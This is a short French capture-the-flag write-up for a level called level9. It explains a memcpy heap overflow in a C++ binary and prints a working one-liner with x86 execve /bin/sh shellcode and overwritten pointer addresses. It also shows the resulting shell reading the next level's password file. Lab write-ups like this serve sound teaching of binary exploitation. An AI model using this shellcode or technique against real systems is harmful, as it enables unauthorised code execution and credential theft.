#### Etape 1 : Décompilation
L'executable est en C++, il instancie des classe N puis appelle une méthode *setAnnotation* qui éxécute un memcpy sur l'argument passé au binaire pour copier son contenu dans une instance N. 
Aprés le memcpy l'instance N exécutera l'un de ces pointeurs.

#### Etape 2 : Objectif

Exploiter la faille de memcpy pour réecrire les adresses qui suivent et éxécuter un */bin/sh*.

#### Etape 3 : Informations manquantes

On cherche d'abord l'offset pour réecrire une adresse.
Il se trouve a 108 caractères.
Cependant si on écris un shellcode avec le nombre de caractères pour compléter ça ne fonctionne pas on segfault.
En cherchant on s'aperçoit que le programme appelle un autre pointeur.

La solution est donc d'écrire d'abord l'adresse du pointeur qui sera déréférencer, ajouter le shellcode puis terminer par le premier pointeur qui sera appeler.

#### Etape 4 : Execution 

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08"  + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```